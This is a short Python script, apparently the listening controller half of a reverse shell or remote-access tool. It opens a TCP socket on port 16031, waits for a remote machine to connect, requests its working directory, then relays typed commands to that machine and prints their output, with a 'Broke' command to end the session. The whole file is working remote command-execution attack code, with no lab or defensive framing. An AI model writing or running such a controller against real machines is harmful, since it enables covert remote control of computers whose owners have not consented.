import socket
from tkinter import *
from tkinter import ttk

import os

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'


host = ''
puerto =  16031

so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

so.bind((host,puerto))

os.system("cls")
so.listen(10)
print(YELLOW+"Waiting")




def acp():
    Fi = 0
    conn , adr = so.accept()
    os.system("cls")
    print(YELLOW+"Conected To: "+adr[0]+"\n\n")
    conn.send(str.encode("PAT"))
    pat1 = conn.recv(20480)
    pat = pat1.decode()
    pat = pat.replace('\\\\','/')

    
    while True:
        

        #comando = input('Comando > ')
        #if len(str.encode(comando)) > 0:

            #conn.send(str.encode(comando))
        #z = conn.recv(1024)

        comando = input(BLUE+pat+" > "+MAGENTA)

        if comando[:2] == 'cd':
            if comando != "cd " or comando != 'cd':
                comando = comando.replace('/','\\')
                conn.send(str.encode(comando))
                pat1 = conn.recv(20480)
                pat = str(pat1.decode())
        elif comando == "Broke":
            conn.send(str.encode("Broke"))
            print(RESET+" \n \n Why? :C \n\n")
            break
        elif len(comando) > 0:
            conn.send(str.encode(comando))
            Output = str(conn.recv(20480))
            z1 = len(Output)-1
            Output2 = str(Output[5:z1])
            Output2 = Output2.replace('\\n','\n',)
            Output2 = Output2.replace('\\r','\r',)
            Output2 = Output2.replace('\\','',)
            print(RED+"\n"+Output2+"\n")
    conn.close()

acp()
